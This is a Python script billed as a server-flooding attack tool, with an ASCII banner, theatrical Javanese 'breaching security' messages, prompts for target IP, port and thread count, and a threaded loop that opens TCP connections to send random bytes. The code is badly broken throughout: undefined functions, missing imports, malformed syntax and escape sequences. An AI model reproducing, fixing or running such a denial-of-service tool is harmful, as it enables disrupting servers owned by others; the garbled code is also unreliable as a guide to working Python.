#!/usr/bin/python
# _*_ coding: utf-8 _*_
import sys
import os
import time
import socket
import random
import string
import time
import requests
import progressbar
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ZH = '\033[97m'

# CLEAR
os.system("clear")
print("")
print("\033[33m         @ @ @     @ @ @ @ @   @ @ @ @        @ @ @      @ @ @ @       \033[0m")
print("\033[33m      @        @          @    @       @    @        @   @       @     \033[0m")
print("\033[33m     @          @        @     @        @  @          @  @        @    \033[0m")
print("\033[96m     @          @       @      @        @  @          @  @        @    \033[0m")
print("\033[96m     @          @      @       @       @   @          @  @       @     \033[0m")
print("\033[31m     @          @     @        @ @ @ @     @          @  @ @ @ @       \033[0m")
print("\033[31m      @        @     @         @            @        @   @      @      \033[0m")
print("\033[31m         @ @ @      @ @ @ @ @  @               @ @ @     @        @    \033[0m")
print(" ")
print("\033[96m                                                 @ @ @        @      \033[0m")
print("\033[96m                                               @       @     @       \033[0m")
print("\033[96m                                                      @     @     @  \033[0m")
print("\033[92m                                                    @      @      @  \033[0m")
print("\033[92m                                                  @       @ @ @ @ @  \033[0m")
print("\033[92m                                                @ @ @ @ @         @  \033[0m")
print(" ")
print("\033[96m≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠\033[0m")
print("\033[1m   B R I G A D E   A T T A C K E R   Z N E E P E R   E L I T E            \033[0m")
print("\033[1m                        design by: Za'99                                  \033[0m")
print("\033[1m                            ———0———                                          \033[0m")
print("\033[96m≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠\033[0m")
ip = str_input("033[94m[\033[0m" "\033[1m+\033\0m" "\033[94m]\033[0m" "\033[91mIP Target \033[0m : ")
print("\033[97m⁵⁵⁵>\033\0m")
port = int(input("033[94m[\033[0m" "\033[1m*\033\0m" "\033[94m]\033[0m" "\033[91mPort \033[0m : "))
print("\033[97m⁵⁵⁵>\033[0m")
packs = int(input("033[94m[\033[0m" "\033[1m*\033\0m" "\033[94m]\033[0m" "\033[91mPackets{0} \033[0m : "))
print("\033[97m⁵⁵⁵>\033\0m")
thread = int(input("033[94m[\033[0m" "\033[1m*\033\0m" "\033[94m]\033[0m" "\033[91mThreads \033[0m : "))
print("\033[97m⁵⁵⁵>\033\0m")
os.system("clear")
print ("\033[92mBIRUH BIDDAM NAFDIKA YAA AQSHA 033[0m ",
print ("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> SIYAP-SIYAP GOLEK SERVER \033[0m ",
time.sleep(5)
print ("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> MIWITI GOLEK SAMBUNGAN \033[0m ",
time.sleep(5)
print ("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> NEMBUS LAPISAN KEAMANAN \033[0m ",
time.sleep(5)
print ("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> DIGAWE SAMBUNGAN \033[0m ",
time.sleep(5)
print ("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> WESS TAK KEMPLANGI SRIWILL \033[0m".)



def animated_marker();
    widgets = [FormatLabel('Animated Bouncer: value %(value)d - '),
               BouncingBar(marker=RotatingMarker())]

    pbar = ProgressBar(widgets=widgets).start()
    for i in pbar((i for i in range(180))):
        time.sleep(5)
        bar.update(i)


animated_marker()

def start():
   r = random_urandom(10)
   u = int((0)
   while True
       try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip,port))
         s.send(r)
         u += 1
         print("\033[92m[\033[97m+\033[92m]\033[92m0ps BADAI GURUN " +str(u)+ " \033[93mZNEEPER B453 " +str()+ " \033[1m" +ip+ "\033[0m" )
    except:
      s.close()
      print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")

for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()







